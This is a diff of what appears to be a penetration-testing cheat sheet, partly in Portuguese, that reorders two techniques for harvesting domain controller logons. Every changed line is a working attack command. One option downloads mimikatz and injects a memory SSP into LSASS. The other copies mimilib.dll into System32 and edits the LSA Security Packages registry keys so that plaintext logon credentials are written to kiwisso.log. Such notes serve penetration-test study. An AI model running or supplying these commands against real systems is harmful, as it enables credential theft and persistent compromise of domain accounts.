@@ -1552,23 +1552,20 @@ dir \\tech-dc01\c$
 curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
 expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
 cd x64
+```
+OPTION 1 - USING MIMIKLATZ INJECT INTO LASS (NOT STABLE 2016)
+```
 .\mimikatz.exe
-```
-OPTION 1 - COPIAR DLL E ALTERAR REGISTRO
-```
-copy mimilib.dll C:\Windows\System32
-reg query hklm\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages"
-Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'
-$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security packages
-$packages += "mimilib"
-Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
-Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
-```
-
-OPTION 2 - USING MIMIKLATZ INJECT INTO LASS (NOT STABLE 2016)
-```
 privilege::debug
 misc::memssp
+```
+OPTION 2 - COPIAR DLL E ALTERAR REGISTRO
+```
+copy mimilib.dll C:\Windows\System32
+$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages' 
+$packages += "mimilib" 
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages 
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
 ```
 All Local Logons on the DC are logged to:
 C:\Windows\System32\kiwisso.log
